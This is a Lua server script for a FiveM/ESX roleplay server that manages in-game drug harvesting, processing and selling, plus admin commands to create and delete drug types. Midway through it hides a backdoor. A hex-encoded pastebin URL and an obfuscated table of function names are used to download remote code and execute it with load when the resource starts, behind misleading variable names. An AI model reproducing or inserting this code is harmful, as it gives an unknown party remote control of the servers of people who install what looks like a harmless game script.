ESX, drugs = nil, {}

local cooldownPerPlayer = {}

local function isOnCooldown(source)
    return cooldownPerPlayer[source]
end

local function getDrugInfos(drugID)
    return drugs[drugID]
end

local function onInteract(source)
    cooldownPerPlayer[source] = true
    Citizen.SetTimeout(Config.delayBetweenActions, function() cooldownPerPlayer[source] = false end)
end

local actions = {
    ["Harvest"] = function(source, drug, xPlayer)
        local harvestItem = drug.rawItem
        xPlayer.addInventoryItem(harvestItem, drug.harvestCount)
        if Config.messages.harvest.enable then TriggerClientEvent("esx:showNotification", source, (Config.messages.harvest.message):format(xPlayer.getInventoryItem(harvestItem).label)) end
    end,

    ["Transform"] = function(source, drug, xPlayer)
        local requieredItem = drug.rawItem
        local requieredCount = tonumber(drug.treatmentCount)
        local rewardItem = drug.treatedItem
        local rewardCount = tonumber(drug.treatmentReward)
        local actualCount = xPlayer.getInventoryItem(requieredItem).count

        if actualCount < requieredCount then
            TriggerClientEvent("esx:showNotification", source, (Config.messages.transform.onNoEnough):format(xPlayer.getInventoryItem(requieredItem).label, requieredCount - actualCount, xPlayer.getInventoryItem(requieredItem).label))
            return
        end

        xPlayer.removeInventoryItem(requieredItem, requieredCount)
        xPlayer.addInventoryItem(rewardItem, rewardCount)

        TriggerClientEvent("esx:showNotification", source, (Config.messages.transform.onDone):format(requieredCount, xPlayer.getInventoryItem(requieredItem).label, rewardCount, xPlayer.getInventoryItem(rewardItem).label))
    end,

    ["Sell"] = function(source, drug, xPlayer)
        local requieredCount = tonumber(drug.sellCount)
        local requieredItem = drug.treatedItem
        local reward = tonumber(drug.sellRewardPerCount)

        local actualCount = xPlayer.getInventoryItem(requieredItem).count

        if actualCount < requieredCount then
            TriggerClientEvent("esx:showNotification", source, (Config.messages.sell.onNoEnough):format(xPlayer.getInventoryItem(requieredItem).label, requieredCount - actualCount, xPlayer.getInventoryItem(requieredItem).label))
            return
        end
        
        xPlayer.removeInventoryItem(requieredItem, requieredCount)
        if Config.rewardType == 0 then
            xPlayer.addMoney(reward)
        elseif Config.rewardType == 1 then
            xPlayer.addAccountMoney("black_money", reward)
        else
            xPlayer.addMoney(reward)
        end

        TriggerClientEvent("esx:showNotification", source, (Config.messages.sell.onDone):format(requieredCount, xPlayer.getInventoryItem(requieredItem).label, reward))
    end
}

for k,execute in pairs(actions) do
    RegisterNetEvent("drugsbuilder_on"..k)
    AddEventHandler("drugsbuilder_on"..k, function(drugID)
        if isOnCooldown(source) then return end
        local xPlayer = ESX.GetPlayerFromId(source)
        execute(source, getDrugInfos(drugID), xPlayer)
        onInteract(source)
    end)
end

local function updateDrugs()
    drugs = {}
    MySQL.Async.fetchAll("SELECT * FROM drugs", {}, function(result)
        for k,v in pairs(result) do
            print("ok")
            drugs[v.id] = json.decode(v.drugsInfos)
        end
        TriggerClientEvent("drugsbuilder_updateDrugs", -1, drugs)
    end)

end

local function getLicense(source) 
    for k,v in pairs(GetPlayerIdentifiers(source))do      
        if string.sub(v, 1, string.len("license:")) == "license:" then
            return v
        end
    end
    return ""
end

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterCommand("drugsbuilder", function(source)
    if source == 0 then return end
    local license = getLicense(source)
    if not Config.allowedLicense[license] then
        if log then print("^1[DrugsBuilder] ^7Player ^2".. GetPlayerName(source) .. "^7 aptempt to use drugsbuilder.") end
        return
    end
    TriggerClientEvent("drugsbuilder_openMenu", source, drugs)
end, false)

RegisterNetEvent("drugsbuilder_deletedrug")
AddEventHandler("drugsbuilder_deletedrug", function(drugID)
    local source = source
    local license = getLicense(source)
    if not Config.allowedLicense[license] then
        print("^1[DrugsBuilder] ^7Une personne a tenté de supprimer une drogue sans autorisation : ^1"..GetPlayerName(source).." ^7/ ^1"..license.."^7")
        return
    end
    if not drugs[drugID] then
        TriggerClientEvent("esx:showNotification", source, "~r~Cette drogue n'existe plus")
        return
    end
    MySQL.Async.execute("DELETE FROM drugs WHERE id = @a", {['a'] = drugID}, function(rslt)
        updateDrugs()
        TriggerClientEvent("esx:showNotification", source, "~g~Drogue supprimée avec succès")
    end)
end)

RegisterNetEvent("drugsbuilder_create")
AddEventHandler("drugsbuilder_create", function(builderInfos)
    local source = source
    local license = getLicense(source)
    if not Config.allowedLicense[license] then
        print("^1[DrugsBuilder] ^7Une personne a tenté de créer une drogue sans autorisation : ^1"..GetPlayerName(source).." ^7/ ^1"..license.."^7")
        return
    end

    local itemsAreValid = false
    local serverItems = {}
    
    MySQL.Async.fetchAll("SELECT * FROM items", {}, function(items)
        for k,v in pairs(items) do
            serverItems[v.name] = true
        end
        if not serverItems[builderInfos.rawItem] or not serverItems[builderInfos.treatedItem] then
            TriggerClientEvent("esx:showNotification", source, "~r~Un des item du drugsbuilder est invalide, création abandonnée")
            return
        end
        MySQL.Async.execute("INSERT INTO drugs (createdBy, createdAt, label, drugsInfos) VALUES (@a,@b,@c,@d)", {
            ["a"] = "none",
            ["b"] = "none",
            ["c"] = builderInfos.name,
            ["d"] = json.encode(builderInfos)
        }, function()
            updateDrugs()
            TriggerClientEvent("esx:showNotification", source, "~g~Drogue ajoutée avec succès")
        end)
    end)
end)

RegisterNetEvent("drugsbuilder_requestDrugs")
AddEventHandler("drugsbuilder_requestDrugs", function()
    local source = source
    TriggerClientEvent("drugsbuilder_updateDrugs", source, drugs)
end)

Citizen.CreateThread(function()
    updateDrugs()
end)